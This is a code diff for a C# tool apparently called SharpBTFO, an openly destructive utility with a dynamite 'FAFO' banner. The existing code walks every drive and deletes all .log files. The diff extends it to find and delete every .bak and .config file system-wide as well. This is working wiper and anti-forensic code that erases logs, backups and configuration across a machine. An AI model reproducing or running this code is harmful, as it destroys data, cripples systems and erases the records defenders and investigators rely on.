@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Linq;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -104,10 +105,10 @@ namespace SharpBTFO
                 string[] drives = Directory.GetLogicalDrives();
                 foreach (string drive in drives)
                 {
-                    Console.WriteLine($"[+] Finding all .log files on {drive}");
-                    logs.AddRange(GetAllFilesFromFolder(drive, "*.log", true));
+                    Console.WriteLine($"[+] Finding all .log, .bak, and .config files on {drive}");
+                    logs.AddRange(GetAllFilesFromFolder(drive, true));
                 }
-                Console.WriteLine($"[+] Found {logs.Count} .log files");
+                Console.WriteLine($"[+] Found {logs.Count} .log, .bak, and .config files");
                 Console.WriteLine($"[+] Deleting .log files");
                 int logCounter = 0;
                 foreach (string log in logs)
@@ -121,22 +122,22 @@ namespace SharpBTFO
                     catch (Exception ex)
                     {
                         btfo = false;
-                        Console.WriteLine($"[!] Error Deleting Log File: {log} - {ex.Message.Trim()}");
+                        Console.WriteLine($"[!] Error Deleting File: {log} - {ex.Message.Trim()}");
                     }
                 }
-                Console.WriteLine($"[+] Deleted {logCounter} .log files");
+                Console.WriteLine($"[+] Deleted {logCounter} .log, .bak, and .config files");
             }
             catch (Exception ex)
             {
                 btfo = false;
-                Console.WriteLine($"[!] Error Finding Log Files: {ex.Message.Trim()}");
+                Console.WriteLine($"[!] Error finding files by extension: {ex.Message.Trim()}");
             }
             if (btfo)
             {
                 printFooter();
             }
         }
-        public static List<string> GetAllFilesFromFolder(string root, string searchFilter, bool searchSubfolders)
+        public static List<string> GetAllFilesFromFolder(string root, bool searchSubfolders)
         {
             Queue<string> folders = new Queue<string>();
             List<string> files = new List<string>();
@@ -146,7 +147,7 @@ namespace SharpBTFO
                 string currentFolder = folders.Dequeue();
                 try
                 {
-                    string[] filesInCurrent = Directory.GetFiles(currentFolder, searchFilter, SearchOption.TopDirectoryOnly);
+                    var filesInCurrent = Directory.EnumerateFiles(currentFolder, "*.*", SearchOption.TopDirectoryOnly).Where(s => s.EndsWith(".log") || s.EndsWith(".bak") || s.EndsWith(".config"));
                     files.AddRange(filesInCurrent);
                 }
                 catch { /*nothing*/ }
@@ -171,10 +172,10 @@ namespace SharpBTFO
                                                          c=====e
                                                             H
                                                             H
-   ____________                                          ,,_H__
-  (__((__((___()                                        /|     |
- (__((__((___()()                                      / |FAFO |
-(__((__((___()()()____________________________________/  |_____|";
+       ____________                                      ,,_H__
+      (__((__((___()                                    /|     |
+     (__((__((___()()                                  / |FAFO |
+    (__((__((___()()()________________________________/  |_____|";
             Console.WriteLine(banner);
         }
         public static void printFooter()
